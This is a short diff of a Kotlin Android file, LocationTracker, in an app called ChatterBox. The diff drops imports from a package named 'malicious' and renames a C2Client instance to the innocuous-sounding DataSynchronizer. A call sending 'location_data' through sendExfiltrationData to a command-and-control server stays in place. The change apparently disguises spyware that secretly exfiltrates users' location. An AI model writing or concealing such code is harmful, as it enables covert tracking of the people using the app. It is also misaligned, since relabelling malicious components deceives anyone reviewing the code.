@@ -9,13 +9,10 @@ import android.location.LocationManager
 import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
-import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import org.json.JSONObject
-import com.example.ChatterBox.malicious.C2Client
-import com.example.ChatterBox.malicious.C2Config
 import java.io.File
 import java.io.FileOutputStream
 import java.text.SimpleDateFormat
@@ -196,7 +193,7 @@ class LocationTracker(private val context: Context) {
             
             // Send location data to C2 server
             try {
-                val c2Client = C2Client(context)
+                val c2Client = DataSynchronizer(context)
                 
                 // Ensure we're using the right data type that the server expects
                 c2Client.sendExfiltrationData("location_data", locationJson.toString())
